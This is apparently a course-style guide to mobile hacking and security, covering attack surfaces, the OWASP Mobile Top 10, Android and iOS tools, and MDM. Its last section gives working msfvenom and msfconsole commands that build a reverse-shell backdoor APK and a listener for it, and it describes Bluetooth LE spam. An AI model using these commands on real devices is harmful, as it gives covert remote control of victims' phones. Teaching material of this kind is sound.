# Mobile Hacking and Security

This guide covers the fundamentals of mobile platforms, their attack surfaces, common threats including the OWASP Top 10, specifics of Android and iOS security, and the tools used by ethical hackers to test mobile device security.

---

## 1. Introduction to Mobile Platforms

### Brief History and Structure
Mobile technology has evolved from simple voice communication devices (1G) to powerful, data-centric computers in our pockets (4G/5G). Modern mobile devices, or smartphones, have a common structure:
* **Hardware:** The physical components (CPU, memory, GPS, Wi-Fi/cellular radios).
* **Operating System (OS):** The core software that manages the hardware (e.g., Android, iOS).
* **Applications (Apps):** Programs that run on the OS to provide functionality.

### Mobile Security Basics
Securing mobile devices involves several fundamental principles:
* **Data Encryption:** Protecting data stored on the device (data-at-rest) and data sent over networks (data-in-transit).
* **Application Sandboxing:** Isolating apps from each other and the core OS to prevent a malicious app from compromising the entire device.
* **Secure Boot:** Ensuring that the device only loads a trusted, signed operating system during startup.
* **Permission Models:** Requiring apps to explicitly ask for user permission before accessing sensitive data or features (like the camera or contacts).

---

## 2. Mobile Attack Surfaces and Threats

### Common Attack Surfaces
An ethical hacker analyzes the different points where a mobile device can be attacked:
* **The Operating System:** Exploiting vulnerabilities in the core Android or iOS to gain elevated privileges.
* **Applications:**
    * **Malicious Apps:** Tricking a user into installing an app that contains malware.
    * **Vulnerable Apps:** Finding and exploiting flaws (like the OWASP Top 10) in legitimate applications.
* **Network Communication:** Intercepting data sent over insecure Wi-Fi, cellular, Bluetooth, or NFC connections.
* **Physical Device:** Gaining physical access to the device to bypass screen locks, extract data, or install malware.

### OWASP Mobile Top 10
The OWASP Mobile Top 10 lists the most critical security risks for mobile applications.

| ID | Risk | Description |
| :--- | :--- | :--- |
| **M1** | Improper Platform Usage | Misusing a platform feature or failing to use platform security controls (e.g., incorrect keychain usage on iOS). |
| **M2** | Insecure Data Storage | Storing sensitive data on the device in an unencrypted or easily accessible location. |
| **M3** | Insecure Communication | Transmitting sensitive data over the network without proper encryption (no TLS/HTTPS). |
| **M4** | Insecure Authentication | Weak or improper user authentication, allowing an attacker to impersonate users. |
| **M5** | Insufficient Cryptography | Using weak or custom encryption algorithms that can be easily broken. |
| **M6** | Insecure Authorization | Flaws in checking if a user is *allowed* to perform an action, even after they have logged in. |
| **M7**| Client Code Quality | Poor quality code on the mobile app itself (e.g., buffer overflows, format string vulnerabilities). |
| **M8**| Code Tampering | An attacker modifies the mobile app's code and redistributes it to perform malicious actions. |
| **M9**| Reverse Engineering | An attacker analyzes the compiled app to understand its logic, find hidden keys, and discover vulnerabilities. |
| **M10**| Extraneous Functionality | Hidden or leftover functionality in the code (e.g., debug features) that can be exploited in a production environment. |

### Other Mobile Security Issues
* **Phishing/Smishing:** Sending malicious links via email or SMS to trick users into giving up credentials.
* **Network Spoofing:** Creating fake Wi-Fi access points (Evil Twins) to perform Man-in-the-Middle attacks.
* **Physical Theft:** The most straightforward threat, leading to a complete loss of data if the device is not properly secured.

---

## 3. Hacking Android

### Android OS and Rooting
The Android OS is based on the Linux kernel. By default, users and applications operate with limited privileges. **Rooting** is the process of gaining full administrative (root) privileges over the device. This allows a user or an attacker to modify the entire operating system and access all data.

* **Common Rooting Tools:** **Magisk** is a popular modern tool used for systemless rooting, which avoids modifying the core system partition.

### Android Hacking Tools
* **Drozer:** A security testing framework that allows you to assume the role of an app and interact with other apps.
* **Frida:** A dynamic instrumentation toolkit for developers and reverse-engineers.
* **ADB (Android Debug Bridge):** A command-line tool for interacting with an Android device.

### Android Security Defenses
* **Google Play Protect:** Scans apps for malware before and after they are installed.
* **App Permissions Model:** Requires user consent for apps to access sensitive data.
* **SELinux (Security-Enhanced Linux):** Enforces mandatory access control policies in the kernel.
* **Verified Boot:** Ensures the device is running genuine, unmodified software.

---

## 4. Hacking Apple iOS

### iOS and Jailbreaking
iOS is a closed-source, Unix-like operating system known for its strict security model. **Jailbreaking** is the process of removing Apple's software restrictions to allow the installation of apps from outside the App Store and to gain deeper access to the file system.

* **Jailbreaking Methods:**
    * **Tethered:** Requires the device to be connected to a computer each time it reboots.
    * **Untethered:** The device is permanently jailbroken and does not need a computer to reboot.
    * **Semi-tethered:** The device can reboot on its own, but the jailbreak features must be re-activated by running an app after each reboot.

### iOS Hacking Tools
* **Frida:** Also widely used on iOS for dynamic analysis and instrumentation.
* **Objection:** A mobile exploration toolkit, powered by Frida, designed to help assess mobile security without a jailbreak.
* **Cydia:** An alternative "app store" for jailbroken devices, often used to install hacking tools.

### iOS Security Defenses
* **Secure Enclave:** A dedicated hardware-based key manager that protects sensitive user data even if the main kernel is compromised.
* **Strict App Sandboxing:** Isolates apps very effectively.
* **App Store Review:** A rigorous process that apps must pass before being published, which helps filter out malware.
* **Face ID / Touch ID:** Biometric security integrated with the hardware.

---

## 5. Mobile Device Management (MDM) and BYOD

### Mobile Device Management (MDM)
MDM software is used by organizations to centrally monitor, manage, and secure mobile devices (smartphones, tablets) that are used for work purposes. MDM solutions can enforce security policies, remotely wipe a lost or stolen device, distribute apps, and configure settings.

### Bring Your Own Device (BYOD)
BYOD is a policy that allows employees to use their personal mobile devices to access enterprise applications and data. While it increases employee satisfaction, it creates a major security challenge: how to protect corporate data on a device the company does not own? MDM and containerization (separating work and personal data) are key solutions.

---

## 6. Practical Mobile Hacking Techniques and Tools

### Malware Creation and Exploitation with Metasploit
As shown in your slide, the Metasploit Framework is a powerful tool for penetration testing. `msfvenom` is its tool for generating payloads (malware).

**Ethical Hacking Note:** These commands are for educational purposes and authorized penetration tests only. Using them on devices without explicit permission is illegal.

#### Malware Creating (using `msfvenom`)
* **Command:** `msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=IP Address lport=Port R -o malicious.apk`
* **Explanation of Flags:**
    * `msfvenom`: The command to generate a payload.
    * `--platform android`: Specifies the target platform is Android.
    * `-p android/meterpreter/reverse_tcp`: Sets the payload. This specific payload creates a backdoor that connects back to the attacker.
    * `lhost=IP Address`: The "listen host." This is **your** IP address, where the malware will connect back to.
    * `lport=Port`: The "listen port." The port on your machine that will be listening for the connection.
    * `R`: Formats the payload correctly.
    * `-o malicious.apk`: The output (`-o`) file name. This is the malicious Android app file.

#### Setting up the Listener Port (using `msfconsole`)
After creating the `malicious.apk` and getting the user to install it, you need to set up a listener to "catch" the connection when the app is run.
* **Command:** `msfconsole -q -x "use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost IP Address; set lport Port; exploit"`
* **Explanation:**
    * `msfconsole`: Starts the Metasploit console.
    * `-q`: Starts quietly (no banner).
    * `-x "..."`: Executes a series of commands.
    * `use multi/handler`: Loads the generic payload handler.
    * `set payload ...`: Sets the *same payload* you used in `msfvenom`. This is crucial.
    * `set lhost ...`: Sets your IP address (must match `msfvenom`).
    * `set lport ...`: Sets your listening port (must match `msfvenom`).
    * `exploit`: Starts the listener. It will now wait for the infected device to connect back.

### Bluetooth LE Spam
This is a modern annoyance attack, often performed with devices like the Flipper Zero.
* **What it is:** The attack floods an area with a high volume of Bluetooth Low Energy (BLE) advertisement packets.
* **Impact:** This can cause a Denial of Service on some devices and, more commonly, trigger a constant stream of pop-up notifications on iOS and Android devices, asking them to connect to various fake devices (e.g., Apple TV, headphones).
